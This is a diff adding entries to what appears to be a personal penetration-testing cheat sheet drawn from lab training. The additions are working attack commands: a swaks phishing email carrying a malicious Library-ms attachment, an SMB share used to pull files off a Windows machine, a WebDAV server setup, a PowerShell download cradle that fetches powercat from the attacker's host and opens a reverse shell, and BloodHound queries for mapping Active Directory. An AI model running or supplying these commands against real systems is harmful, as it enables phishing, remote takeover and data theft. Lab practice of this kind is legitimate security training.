@@ -61,6 +61,7 @@
 * [Mimikatz](#Mimikatz)
 * [LinPEAS](#LinPEAS)
 * [Git](#Git)
+* [BloodHound)(#BloodHound)
 * [Windows Privilege Escalation](#Windows-Privilege-Escalation)
   * [Enumerating Windows](#Enumerating-Windows)
   * [Leveraging Windows Services](#Leveraging-Windows-Services)
@@ -174,6 +175,8 @@ scp kali@192.168.0.17:/home/kali/filename filename
 
 ~~~ bash
 swaks --to target@example.com --from attacker@example.com --server example.com --auth LOGIN --auth-user attacker@example.com --auth-password password123 --header 'Subject: Test email' --body "This email contains an attachment." --attach @filename.bat
+
+swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ~~~
 
 
@@ -358,6 +361,17 @@ smbclient -N \\\\<IP>\\backups
 
 ~~~ bash
 smbclient \\\\<IP>\\secrets -U Administrator --pw-nt-hash <NTLM_HASH>
+~~~
+
+## File transfer(Win to Kali) with impacket-smbserver
+
+~~~ bash
+impacket-smbserver share $(pwd) -smb2support -username offsec -password offsec
+~~~
+
+~~~ powershell
+net use \\192.168.45.171\share /user:offsec offsec
+copy 20250907215911_BloodHound.zip \\192.168.45.171\share\
 ~~~
 
 
@@ -984,16 +998,14 @@ reference: https://www.hahwul.com/blog/2017/web-hacking-metadata-payload/
 
 # Microsoft Windows Library Files
 
-*칼리 - 윈도우 파일 송수신 기능*
-
-## Installation of wsgidav
+## 1. Installation of wsgidav
 
 ~~~ bash
 pip install wsgidav
 wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/webdav/
 ~~~
 
-## config.Library-ms
+## 2. Create "config.Library-ms"
 
 ~~~ xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -1016,6 +1028,17 @@ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/webd
 		</searchConnectorDescription>
 	</searchConnectorDescriptionList>
 </libraryDescription>
+~~~
+
+## 3. PowerShell Download Cradle and PowerCat Reverse Shell Execution for shortcut file
+
+~~~
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+python3 -m http.server 8000
+~~~
+
+~~~
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://[Kali-IP]:8000/powercat.ps1'); powercat -c [Kali-IP] -p 4444 -e powershell"
 ~~~
 
 
@@ -1136,6 +1159,21 @@ git log
 
 ~~~ bash
 git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
+~~~
+
+# BloodHound
+
+## Custom query
+
+~~~
+# Display all computers
+MATCH (m:Computer) RETURN m
+
+# Display all users
+MATCH (m:User) RETURN m
+
+# Display all active sessions
+MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
 ~~~
 
 
